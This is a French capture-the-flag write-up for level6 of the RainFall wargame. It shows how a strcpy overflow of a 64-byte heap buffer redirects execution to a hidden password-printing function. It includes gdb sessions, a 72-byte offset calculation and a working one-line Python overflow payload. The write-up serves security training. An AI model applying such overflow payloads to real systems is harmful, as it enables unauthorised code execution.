# Solution

```
./level6 "$(python -c 'print("A" * 72 + "\x54\x84\x04\x08")')"
```

# Explication du level

Dans ce niveau il y a plusieur point que l'on peut remarquer

- la fonction n affiche le mot de passe mais n'est jamais apeler
- dst est malloc avec 0x40 ce qui correspond a 64 en decimal 
- strcpy est appeler avec dst pour copier la premiere str envoyer en argument 


On peu en deduire que si l'on met une chaine de plus de 64 caractere cela va depasser la memoire et ecrasé les element de la stack adjacent.
Il suffit donc de faire comme pour le level2 un overflow exploit

--------------------------------------
Adresse de n :
```
level6@RainFall:~$ gdb ./level6 
(gdb) p &n
$1 = (<text variable, no debug info> *) 0x8048454 <n>
```
---------------------------------------

Offset de l'adresse de retour :

D'abord generons une string qui ne se repete pas sur https://zerosum0x0.blogspot.com/2016/11/overflow-exploit-pattern-generator.html

str : Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2A

Ensuite on peu sois utiliser peda sois passer par gdb comme nous avons deja utiliser peda, nious allons faire avec gdb cette fois ci :

```
level6@RainFall:~$ gdb ./level6
(gdb) b main
Breakpoint 1 at 0x804847f
(gdb) run Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2A
Starting program: /home/user/level6/level6 str : Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2A

Breakpoint 1, 0x0804847f in main ()
(gdb) n
Single stepping until exit from function main,
which has no line number information.

Program received signal SIGSEGV, Segmentation fault.
0x41346341 in ?? ()

##Apres l'overflow :
(gdb) info register
eax            0x41346341	1093952321
ecx            0xbffff900	-1073743616
edx            0x804a060	134520928
ebx            0xb7fd0ff4	-1208152076
esp            0xbffff69c	0xbffff69c
ebp            0xbffff6c8	0xbffff6c8
esi            0x0	0
edi            0x0	0
eip            0x41346341	0x41346341
eflags         0x210202	[ IF RF ID ]
cs             0x73	115
ss             0x7b	123
ds             0x7b	123
es             0x7b	123
fs             0x0	0
gs             0x33	51
```

Comme $eip est = 41346341 si on converti cela en caractere lisible cela donne A4cA on inverse et cela donne Ac4A qui apparait au 72 char de notre str

--------------------------------------------

Creation de l'exploit :

offset : 72
adresse de n : 0x8048454
```
./level6 "$(python -c 'print("A" * 72 + "\x54\x84\x04\x08")')"
```